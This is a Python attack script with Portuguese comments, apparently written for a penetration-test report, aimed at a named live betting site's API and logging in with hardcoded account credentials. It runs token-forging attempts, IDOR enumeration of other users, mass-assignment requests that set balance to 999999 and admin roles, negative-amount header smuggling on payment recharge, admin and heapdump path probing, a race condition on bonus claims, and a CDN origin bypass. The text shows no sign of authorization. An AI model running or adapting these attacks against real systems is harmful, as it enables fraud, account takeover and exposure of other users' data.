"""
auto_burp.py — Roda os testes que estavam reservados pro Burp Suite.

Estratégia: faz login imediatamente antes de cada bloco de teste pra
contornar o TTL curto do token. Cada bloco usa 1 token novo.

Saídas:
- auto_burp_resultados.json (estruturado, pra análise)
- auto_burp_resultados.md   (legível, pra colar no relatório)
"""
from __future__ import annotations
import urllib.request, urllib.error, ssl, json, time, threading, hashlib, sys
from datetime import datetime, timezone

# ───────────────────────── config ─────────────────────────

BASE  = "https://ds.amizade777.com"
PKG   = "com.slots.big"
PHONE = "21998498419"
PWD   = "21998498419"
DID   = "0beb614f-8838-43ef-00fc-0029f7d5d20f"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

# ───────────────────────── http helpers ─────────────────────────

def _req(method: str, url: str, headers: dict, body: bytes | None,
         timeout: int = 15) -> tuple[int, dict, str]:
    try:
        r = urllib.request.Request(url, data=body, headers=headers, method=method)
        with urllib.request.urlopen(r, timeout=timeout, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read(8192).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        try:
            return e.code, dict(e.headers or {}), e.read(8192).decode("utf-8", "ignore")
        except Exception:
            return e.code, {}, ""
    except Exception as ex:
        return 0, {}, f"<EXCEPTION {type(ex).__name__}: {ex}>"

def post(path: str, data: dict, token: str | None = None,
         extra_headers: dict | None = None, host: str | None = None) -> tuple[int, dict, dict]:
    h = {
        "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Accept":       "application/json, */*",
        "Origin":       BASE,
        "Referer":      BASE + "/",
    }
    if token:
        h["Token"] = token
    if extra_headers:
        h.update(extra_headers)
    url = path if path.startswith("http") else BASE + path
    if host:
        url = url.replace(BASE.split("//", 1)[1], host)
    st, hdrs, raw = _req("POST", url, h, json.dumps(data).encode())
    try:
        body = json.loads(raw)
    except Exception:
        body = {"_raw": raw[:500]}
    return st, hdrs, body

def get(path: str, token: str | None = None,
        extra_headers: dict | None = None, host: str | None = None) -> tuple[int, dict, dict]:
    h = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept":     "application/json, */*",
        "Origin":     BASE,
        "Referer":    BASE + "/",
    }
    if token:
        h["Token"] = token
    if extra_headers:
        h.update(extra_headers)
    url = path if path.startswith("http") else BASE + path
    if host:
        url = url.replace(BASE.split("//", 1)[1], host)
    st, hdrs, raw = _req("GET", url, h, None)
    try:
        body = json.loads(raw)
    except Exception:
        body = {"_raw": raw[:500]}
    return st, hdrs, body

# ───────────────────────── login fresco ─────────────────────────

def login_fresh() -> tuple[str, dict]:
    """Faz login e devolve (token, user_info_dict)."""
    payload = {
        "appChannel": "pc", "appPackageName": PKG, "deviceId": DID,
        "deviceModel": "WEB", "deviceVersion": "WEB", "appVersion": "1.0.0",
        "sysTimezone": None, "sysLanguage": None,
        "phone": PHONE, "password": PWD,
    }
    st, _, body = post("/prod-api/player/sign-in", payload)
    if body.get("code") != 200:
        raise RuntimeError(f"Login falhou: {body}")
    data = body.get("data") or {}
    return data["token"], data.get("user_info") or {}

# ───────────────────────── relatório ─────────────────────────

RESULTS: list[dict] = []

def record(category: str, test: str, request_summary: dict, response: dict,
           interpretation: str, severity: str = "info") -> None:
    entry = {
        "ts": datetime.now(timezone.utc).isoformat(),
        "category": category,
        "test": test,
        "request": request_summary,
        "response": response,
        "interpretation": interpretation,
        "severity": severity,
    }
    RESULTS.append(entry)
    sev_tag = {
        "critical": "🔴",
        "high":     "🟠",
        "medium":   "🟡",
        "low":      "🔵",
        "info":     "⚪",
    }.get(severity, "⚪")
    code = response.get("code", "?")
    msg  = str(response.get("msg", ""))[:60]
    print(f"  {sev_tag} [{category} / {test}] code={code} msg={msg!r}")
    print(f"     ↪ {interpretation}")

# ───────────────────────── BLOCO 1 — Token forging ─────────────────────────

def block_token_forging() -> None:
    print("\n" + "=" * 60)
    print("BLOCO 1 — MANIPULAÇÃO DO TOKEN")
    print("=" * 60)

    token, ui = login_fresh()
    my_uid    = ui.get("user_id")
    print(f"  Token fresco: {token}")
    print(f"  Meu user_id:  {my_uid}")

    parts = token.split(":")
    if len(parts) != 4:
        print("  Formato inesperado de token, abortando bloco.")
        return
    uid, ts, port, hash_ = parts

    # T0 — baseline (token original)
    st, _, body = get("/japi/user/balance/querySimpleBalance", token)
    record("token_forging", "T0 baseline (token original)",
           {"token": token},
           {"http": st, "code": body.get("code"), "msg": body.get("msg"), "data": body.get("data")},
           "Linha de base — esperado code=200 e amount válido.",
           "info")

    # T1 — userId trocado pra 1, hash mantido
    forged = f"1:{ts}:{port}:{hash_}"
    st, _, body = get("/japi/user/balance/querySimpleBalance", forged)
    accepted = body.get("code") == 200
    record("token_forging", "T1 uid=1 hash original",
           {"token": forged},
           {"http": st, "code": body.get("code"), "msg": body.get("msg"), "data": body.get("data")},
           ("CRÍTICO: hash não está sendo validado." if accepted
            else "OK — backend rejeita uid trocado com hash original."),
           "critical" if accepted else "info")

    # T2 — userId trocado pra 137028, hash mantido
    forged = f"137028:{ts}:{port}:{hash_}"
    st, _, body = get("/japi/user/balance/querySimpleBalance", forged)
    accepted = body.get("code") == 200
    record("token_forging", "T2 uid=137028 hash original",
           {"token": forged},
           {"http": st, "code": body.get("code"), "msg": body.get("msg"), "data": body.get("data")},
           ("CRÍTICO: hash não inclui userId." if accepted
            else "OK — backend rejeita uid trocado."),
           "critical" if accepted else "info")

    # T3 — timestamp futuro
    forged = f"{uid}:9999999999:{port}:{hash_}"
    st, _, body = get("/japi/user/balance/querySimpleBalance", forged)
    accepted = body.get("code") == 200
    record("token_forging", "T3 timestamp futuro",
           {"token": forged},
           {"http": st, "code": body.get("code"), "msg": body.get("msg")},
           ("Hash não inclui timestamp." if accepted
            else "OK — timestamp validado pelo hash."),
           "high" if accepted else "info")

    # T4 — timestamp 0
    forged = f"{uid}:0:{port}:{hash_}"
    st, _, body = get("/japi/user/balance/querySimpleBalance", forged)
    accepted = body.get("code") == 200
    record("token_forging", "T4 timestamp=0",
           {"token": forged},
           {"http": st, "code": body.get("code"), "msg": body.get("msg")},
           ("Timestamp não validado." if accepted
            else "OK — timestamp validado."),
           "medium" if accepted else "info")

    # T5 — sem hash
    forged = f"{uid}:{ts}:{port}:"
    st, _, body = get("/japi/user/balance/querySimpleBalance", forged)
    accepted = body.get("code") == 200
    record("token_forging", "T5 sem hash",
           {"token": forged},
           {"http": st, "code": body.get("code"), "msg": body.get("msg")},
           ("Hash opcional — CRÍTICO." if accepted
            else "OK — hash obrigatório."),
           "critical" if accepted else "info")

    # T6 — só userId
    forged = f"{uid}"
    st, _, body = get("/japi/user/balance/querySimpleBalance", forged)
    accepted = body.get("code") == 200
    record("token_forging", "T6 só userId",
           {"token": forged},
           {"http": st, "code": body.get("code"), "msg": body.get("msg")},
           ("CRÍTICO: bypass total." if accepted
            else "OK — formato validado."),
           "critical" if accepted else "info")

    # T7 — hash em maiúsculas
    forged = f"{uid}:{ts}:{port}:{hash_.upper()}"
    st, _, body = get("/japi/user/balance/querySimpleBalance", forged)
    accepted = body.get("code") == 200
    record("token_forging", "T7 hash uppercase",
           {"token": forged},
           {"http": st, "code": body.get("code"), "msg": body.get("msg")},
           ("Comparação case-insensitive (anomalia)." if accepted
            else "OK — comparação case-sensitive."),
           "low" if accepted else "info")

    # T8 — recalcular hash sem secret
    candidates = [
        ("md5(uid:ts:port)",     hashlib.md5(f"{uid}:{ts}:{port}".encode()).hexdigest()),
        ("md5(uid:ts:port:)",    hashlib.md5(f"{uid}:{ts}:{port}:".encode()).hexdigest()),
        ("md5(uid:ts)",          hashlib.md5(f"{uid}:{ts}".encode()).hexdigest()),
        ("md5(uid+ts+port)",     hashlib.md5(f"{uid}{ts}{port}".encode()).hexdigest()),
    ]
    for desc, h in candidates:
        forged = f"{uid}:{ts}:{port}:{h}"
        st, _, body = get("/japi/user/balance/querySimpleBalance", forged)
        accepted = body.get("code") == 200
        record("token_forging", f"T8 hash candidato: {desc}",
               {"token": forged, "hash_recipe": desc},
               {"http": st, "code": body.get("code"), "msg": body.get("msg")},
               ("CRÍTICO: secret é vazio/conhecido." if accepted
                else "Hash candidato rejeitado (esperado)."),
               "critical" if accepted else "info")

# ───────────────────────── BLOCO 2 — IDOR path-based ─────────────────────────

def block_idor_path() -> None:
    print("\n" + "=" * 60)
    print("BLOCO 2 — IDOR PATH-BASED")
    print("=" * 60)

    token, ui = login_fresh()
    my_uid    = ui.get("user_id")
    print(f"  Token: {token}")
    print(f"  Meu uid: {my_uid}")

    targets = [my_uid - 1, my_uid + 1, 1, 100, 137001, 137026, 137028, 999999]
    paths = [
        "/japi/user/player/{}",
        "/prod-api/player/{}",
        "/prod-api/user/{}",
        "/prod-api/player/info/{}",
        "/japi/user/{}",
    ]
    for uid in targets:
        for tmpl in paths:
            path = tmpl.format(uid)
            st, _, body = get(path, token)
            code = body.get("code", "?")
            data = body.get("data")
            interesting = (
                code == 200 and isinstance(data, dict) and len(data) > 0
            ) or (st == 200 and code != "?" and code != 200 and code not in (
                102008, 102009, 400, 404, 401, 403
            ))
            if interesting:
                record("idor_path", f"{path} (uid={uid})",
                       {"path": path, "method": "GET", "uid_target": uid},
                       {"http": st, "code": code, "msg": body.get("msg"),
                        "data_keys": list(data.keys()) if isinstance(data, dict) else None,
                        "data_sample": json.dumps(data, ensure_ascii=False)[:300] if data else None},
                       "Possível IDOR — endpoint retornou dados sem 401/403.",
                       "high" if (code == 200 and data) else "low")
            elif code == 200 and data:
                # Verifica se retornou o próprio user (param ignorado)
                returned_uid = data.get("user_id") or data.get("id") or data.get("userId")
                if returned_uid and returned_uid != uid:
                    record("idor_path", f"{path} (uid={uid})",
                           {"path": path, "method": "GET"},
                           {"http": st, "code": code, "returned_uid": returned_uid},
                           f"Param ignorado — retornou uid {returned_uid} em vez de {uid}.",
                           "info")

# ───────────────────────── BLOCO 3 — Mass assignment ─────────────────────────

def block_mass_assignment() -> None:
    print("\n" + "=" * 60)
    print("BLOCO 3 — MASS ASSIGNMENT")
    print("=" * 60)

    token, ui = login_fresh()
    print(f"  Token: {token}")

    # Snapshot do perfil ANTES
    st_before, _, info_before = get("/prod-api/player/info", token)
    if info_before.get("code") != 200:
        # Fallback — alguns tenants usam POST
        st_before, _, info_before = post("/prod-api/player/info", {}, token)
    user_before = info_before.get("data") or {}

    # Tenta UPDATE com campos privilegiados
    payloads = [
        ("balance",       {"balance": 999999}),
        ("vip_level",     {"vipLevel": 99, "vip_level": 99}),
        ("isAdmin",       {"isAdmin": True, "is_admin": 1}),
        ("role",          {"role": "admin", "userType": "admin"}),
        ("permissions",   {"permissions": ["admin", "superuser"]}),
        ("enable",        {"enable": 1}),
        ("multiplo",      {"balance": 999999, "vipLevel": 99, "isAdmin": True,
                            "role": "admin", "withdraw_amount": 999999}),
    ]
    for name, payload in payloads:
        st, _, body = post("/prod-api/player/update", payload, token)
        record("mass_assignment", name,
               {"path": "/prod-api/player/update", "body": payload},
               {"http": st, "code": body.get("code"), "msg": body.get("msg")},
               "Aceito? Verificação no GET seguinte.",
               "info")

    # Snapshot DEPOIS — comparar
    st_after, _, info_after = get("/prod-api/player/info", token)
    if info_after.get("code") != 200:
        st_after, _, info_after = post("/prod-api/player/info", {}, token)
    user_after = info_after.get("data") or {}

    diffs = {}
    for k in set(user_before) | set(user_after):
        if user_before.get(k) != user_after.get(k):
            diffs[k] = {"before": user_before.get(k), "after": user_after.get(k)}

    if diffs:
        record("mass_assignment", "DIFF perfil antes/depois",
               {"compare": "GET /prod-api/player/info"},
               {"diffs": diffs},
               "ALGUM CAMPO MUDOU. Verificar quais.",
               "high")
    else:
        record("mass_assignment", "DIFF perfil antes/depois",
               {"compare": "GET /prod-api/player/info"},
               {"diffs": {}},
               "Nenhum campo mudou — backend ignora updates privilegiados.",
               "info")

# ───────────────────────── BLOCO 4 — Header smuggling no recharge ─────────────────────────

def block_header_smuggling() -> None:
    print("\n" + "=" * 60)
    print("BLOCO 4 — HEADER SMUGGLING NO RECHARGE")
    print("=" * 60)

    token, _ = login_fresh()
    print(f"  Token: {token}")

    base_payload = {
        "token": token, "appPackageName": PKG, "appVersion": "1.0.0",
        "phone": PHONE, "configId": "", "amount": 50, "qr": 1,
    }

    # Linha de base — recharge normal
    st, _, body = post("/prod-api/pay-service/recharge", base_payload, token)
    baseline_code = body.get("code")
    record("header_smuggling", "baseline (amount=50)",
           {"body": base_payload},
           {"http": st, "code": baseline_code, "msg": body.get("msg")},
           "Linha de base.", "info")

    # Headers candidatos
    header_tests = [
        {"X-Original-Amount": "-100"},
        {"X-Real-Amount": "-100"},
        {"X-Amount": "-100"},
        {"X-Forwarded-Amount": "-100"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "15.229.81.27"},  # IP whitelistado da config
        {"X-Real-IP": "15.229.81.27"},
        {"X-Admin": "true"},
        {"X-Admin-Override": "1"},
        {"X-Internal": "1"},
        {"X-Debug": "1"},
        {"X-Original-URL": "/prod-api/admin/finance"},
        {"X-Rewrite-URL": "/prod-api/admin/finance"},
    ]
    for h in header_tests:
        st, _, body = post("/prod-api/pay-service/recharge", base_payload, token, extra_headers=h)
        code = body.get("code")
        # Sucesso = code mudou em relação ao baseline
        anomaly = code != baseline_code
        record("header_smuggling", f"header {list(h.keys())[0]}",
               {"extra_headers": h},
               {"http": st, "code": code, "msg": body.get("msg")},
               (f"ANOMALIA: code={code} (baseline={baseline_code})." if anomaly
                else "Sem efeito — header ignorado."),
               "high" if anomaly else "info")

# ───────────────────────── BLOCO 5 — admin endpoints ─────────────────────────

def block_admin_paths() -> None:
    print("\n" + "=" * 60)
    print("BLOCO 5 — ENDPOINTS ADMIN")
    print("=" * 60)

    token, _ = login_fresh()

    paths = [
        "/prod-api/admin/player/list",
        "/prod-api/admin/user/list",
        "/prod-api/admin/finance",
        "/prod-api/admin/config",
        "/prod-api/admin/recharge/list",
        "/prod-api/admin/withdraw/list",
        "/japi/admin/user/list",
        "/japi/admin/finance",
        "/japi/admin/player/list",
        "/japi/manage/user",
        "/manage/player",
        "/manage/finance",
        "/system/admin",
        "/system/config",
        "/system/log",
        "/superadmin",
        "/backoffice",
        "/operator",
        "/staff",
        "/internal",
        "/debug",
        "/actuator",
        "/actuator/health",
        "/actuator/env",
        "/actuator/heapdump",
        "/actuator/mappings",
        "/swagger-ui.html",
        "/swagger",
        "/v2/api-docs",
        "/v3/api-docs",
        "/api-docs",
    ]
    for path in paths:
        st, _, body = get(path, token)
        code = body.get("code", "?")
        msg  = body.get("msg", "")
        # Interessante = 200 com data, ou status diferente de 404/403/401
        if isinstance(code, int) and code == 200 and body.get("data"):
            record("admin_paths", path,
                   {"path": path},
                   {"http": st, "code": code, "msg": msg,
                    "data_sample": json.dumps(body.get("data"), ensure_ascii=False)[:400]},
                   "POSSÍVEL ACESSO ADMIN.", "high")
        elif st in (200, 302) and code not in (200, 102008, 102009, 400, 401, 403, 404):
            record("admin_paths", path,
                   {"path": path},
                   {"http": st, "code": code, "msg": msg},
                   f"Status interessante — code={code}.", "low")

# ───────────────────────── BLOCO 6 — config dump (set/get) ─────────────────────────

def block_config_dump() -> None:
    print("\n" + "=" * 60)
    print("BLOCO 6 — CONFIG DUMP")
    print("=" * 60)

    token, _ = login_fresh()

    payload = {"appChannel": "pc", "appVersion": "1.0.0", "appPackageName": PKG}
    st, _, body = post("/prod-api/set/get", payload, token)
    if body.get("code") == 200:
        data = body.get("data") or {}
        sensitive_keys = [
            "ipWhites", "withdraw_pay_rate", "withdraw_system_rate",
            "device_user_limit", "ip_user_limit",
            "recharge_amount_max", "recharge_amount_min",
            "mgm_config", "withdraw_config", "ab_condition",
        ]
        leaked = {k: data.get(k) for k in sensitive_keys if k in data}
        record("config_dump", "POST /prod-api/set/get",
               {"path": "/prod-api/set/get"},
               {"http": st, "code": body.get("code"),
                "leaked_keys": list(leaked.keys()),
                "ipWhites": data.get("ab_condition", {}).get("ipWhites"),
                "withdraw_config": data.get("withdraw_config"),
                "mgm_config": data.get("mgm_config")},
               "Config financeira/operacional totalmente exposta.",
               "medium")
    else:
        record("config_dump", "POST /prod-api/set/get",
               {"path": "/prod-api/set/get"},
               {"http": st, "code": body.get("code"), "msg": body.get("msg")},
               "Config não acessível com este token.",
               "info")

# ───────────────────────── BLOCO 7 — race condition no claim ─────────────────────────

def block_race_claim() -> None:
    print("\n" + "=" * 60)
    print("BLOCO 7 — RACE CONDITION (claim de bonus)")
    print("=" * 60)

    token, _ = login_fresh()

    results = []
    lock = threading.Lock()

    def worker(n: int) -> None:
        st, _, body = post("/prod-api/invite/getBindRewardRecord", {}, token)
        with lock:
            results.append({"thread": n, "http": st,
                            "code": body.get("code"), "msg": body.get("msg")})

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(8)]
    for t in threads: t.start()
    for t in threads: t.join(timeout=20)

    accepted = [r for r in results if r.get("code") == 200]
    record("race", "claim invite reward x8",
           {"path": "/prod-api/invite/getBindRewardRecord", "concurrency": 8},
           {"results": results, "accepted_count": len(accepted)},
           (f"RACE CONFIRMADO — {len(accepted)} de 8 aceitos." if len(accepted) >= 2
            else f"Sem race — {len(accepted)} aceito de 8."),
           "high" if len(accepted) >= 2 else "info")

# ───────────────────────── BLOCO 8 — bypass de origem (CDN) ─────────────────────────

def block_origin_bypass() -> None:
    print("\n" + "=" * 60)
    print("BLOCO 8 — BYPASS DE CDN (IP interno)")
    print("=" * 60)

    # IPs vazados:
    candidates = [
        "192.10.0.168:3001",   # vazou na response do registro do aphrodite
        "172.16.0.245:3001",   # documentado no contexto
    ]
    for ip in candidates:
        url = f"http://{ip}/api/"
        try:
            r = urllib.request.Request(url, headers={"Host": "ds.amizade777.com"})
            with urllib.request.urlopen(r, timeout=5) as resp:
                raw = resp.read(2048).decode("utf-8", "ignore")
                record("origin_bypass", ip,
                       {"url": url}, {"http": resp.status, "body": raw[:300]},
                       "CONECTOU — possível bypass de WAF/CDN.",
                       "high")
        except Exception as ex:
            record("origin_bypass", ip,
                   {"url": url}, {"error": str(ex)},
                   "Não conectável de fora (esperado se está atrás de firewall).",
                   "info")

# ───────────────────────── BLOCO 9 — dump em arquivo ─────────────────────────

def dump_results() -> None:
    out_json = "auto_burp_resultados.json"
    with open(out_json, "w", encoding="utf-8") as f:
        json.dump(RESULTS, f, ensure_ascii=False, indent=2, default=str)

    out_md = "auto_burp_resultados.md"
    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    with open(out_md, "w", encoding="utf-8") as f:
        f.write("# Resultados do auto_burp.py\n\n")
        f.write(f"_Executado em: {datetime.now().isoformat()}_\n\n")
        f.write("## Achados ordenados por severidade\n\n")
        for entry in sorted(RESULTS, key=lambda e: sev_order.get(e["severity"], 99)):
            f.write(f"### [{entry['severity'].upper()}] {entry['category']} — {entry['test']}\n\n")
            f.write(f"**Interpretação:** {entry['interpretation']}\n\n")
            f.write("**Request:**\n```json\n")
            f.write(json.dumps(entry["request"], ensure_ascii=False, indent=2, default=str))
            f.write("\n```\n\n")
            f.write("**Response:**\n```json\n")
            f.write(json.dumps(entry["response"], ensure_ascii=False, indent=2, default=str))
            f.write("\n```\n\n---\n\n")
    print(f"\n✅ Resultados em:\n  - {out_json}\n  - {out_md}")

# ───────────────────────── main ─────────────────────────

def main() -> None:
    blocks = [
        ("token_forging",    block_token_forging),
        ("idor_path",        block_idor_path),
        ("mass_assignment",  block_mass_assignment),
        ("header_smuggling", block_header_smuggling),
        ("admin_paths",      block_admin_paths),
        ("config_dump",      block_config_dump),
        ("race_claim",       block_race_claim),
        ("origin_bypass",    block_origin_bypass),
    ]
    for name, fn in blocks:
        try:
            fn()
        except Exception as ex:
            print(f"\n[ERRO no bloco {name}]: {type(ex).__name__}: {ex}")
            record(name, "EXCEPTION", {}, {"error": str(ex)},
                   "Bloco abortado por erro.", "info")
        time.sleep(1)
    dump_results()

if __name__ == "__main__":
    main()
